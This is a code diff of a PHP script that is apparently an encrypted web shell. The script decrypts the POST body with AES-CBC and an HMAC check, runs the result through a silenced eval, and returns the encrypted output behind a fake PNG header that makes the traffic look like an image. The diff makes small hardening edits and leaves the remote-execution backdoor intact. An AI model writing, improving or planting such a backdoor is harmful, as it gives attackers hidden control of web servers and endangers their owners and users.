@@ -6,18 +6,13 @@
 function Decrypt($data) {
     if (!function_exists('openssl_decrypt')) return "";
     
-
     $prefixLen = 68;
     $dataLen = strlen($data);
-    
-
     if ($dataLen <= ($prefixLen + 48)) return "";
     
-
     $encrypted = substr($data, $prefixLen);
     $encLen = strlen($encrypted);
     
-
     $key = "__KEY__";
     $raw = unpack('C*', $key);
     $raw = $raw ? array_values($raw) : [];
@@ -37,14 +32,14 @@ function Decrypt($data) {
     if ($bodyLen <= 0) return "";
     $body = substr($encrypted, 16, $bodyLen);
     
+    if ($iv === false || $tag === false || $body === false) return "";
+    
 
     $macData = $iv . $body;
     $check = hash_hmac('sha256', $macData, $aesKey, true);
     
-
-    if (!hash_equals($check, $tag)) return "";
+    if (!hash_equals($check, $tag)) return ""; 
     
-
     return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
 }
 
@@ -66,14 +61,12 @@ function Encrypt($data) {
     $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
     $macData = $ivStr . $enc;
     $tag = hash_hmac('sha256', $macData, $aesKey, true);
-    
-
     $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
+    
     return $prefix . $ivStr . $enc . $tag;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-
     $postData = file_get_contents("php://input");
     if (!empty($postData)) {
         $deMsg = Decrypt($postData);
@@ -82,7 +75,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             try {
                 @eval($deMsg);
             } catch (\Throwable $e) {
-
             }
             $output = ob_get_contents();
             ob_end_clean();
